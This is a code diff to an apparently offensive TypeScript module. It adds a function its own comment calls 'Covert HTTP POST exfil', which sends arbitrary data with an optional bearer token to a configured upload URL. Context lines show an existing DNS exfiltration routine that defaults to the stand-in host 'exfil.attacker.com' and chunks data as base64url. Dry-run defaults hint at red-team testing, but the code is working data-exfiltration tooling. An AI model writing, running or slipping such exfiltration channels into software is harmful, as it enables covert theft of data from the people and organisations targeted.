@@ -22,6 +22,49 @@ export function chunkData(data: string, chunkSize = 32): string[] {
   return chunks;
 }
 
+export interface HttpExfilResult {
+  uploaded: boolean
+  dryRun: boolean
+  bytes: number
+  statusCode?: number
+  url?: string
+  error?: string
+}
+
+/** Covert HTTP POST exfil — live when opts.live and url configured. */
+export async function exfiltrateHTTP(
+  data: string,
+  opts: { live?: boolean; url?: string; bearerToken?: string } = {},
+): Promise<HttpExfilResult> {
+  const live = opts.live ?? false
+  const url = opts.url ?? process.env.OURMINE_LEAK_UPLOAD_URL ?? ""
+  const bytes = Buffer.byteLength(data, "utf8")
+
+  if (!url) {
+    return { uploaded: false, dryRun: !live, bytes, error: "Set endpoint or OURMINE_LEAK_UPLOAD_URL" }
+  }
+  if (!live) {
+    return { uploaded: false, dryRun: true, bytes, url }
+  }
+
+  try {
+    const headers: Record<string, string> = { "Content-Type": "application/octet-stream" }
+    const token = opts.bearerToken ?? process.env.OURMINE_LEAK_UPLOAD_TOKEN
+    if (token) headers.Authorization = `Bearer ${token}`
+    const res = await fetch(url, { method: "POST", headers, body: data, signal: AbortSignal.timeout(30_000) })
+    return {
+      uploaded: res.ok,
+      dryRun: false,
+      bytes,
+      url,
+      statusCode: res.status,
+      error: res.ok ? undefined : `HTTP ${res.status}`,
+    }
+  } catch (e) {
+    return { uploaded: false, dryRun: false, bytes, url, error: String(e) }
+  }
+}
+
 export async function exfiltrateDNS(data: string, opts: ExfilOptions = {}): Promise<{ sentChunks: number; dryRun: boolean }> {
   const { live = false, domain = "exfil.attacker.com", chunkSize = 30 } = opts;
   const b64 = Buffer.from(data).toString("base64url");
@@ -84,4 +127,4 @@ export async function runStagedExfilTest(
   }
 }
 
-export default { chunkData, exfiltrateDNS, runStagedExfilTest };
+export default { chunkData, exfiltrateDNS, exfiltrateHTTP, runStagedExfilTest };
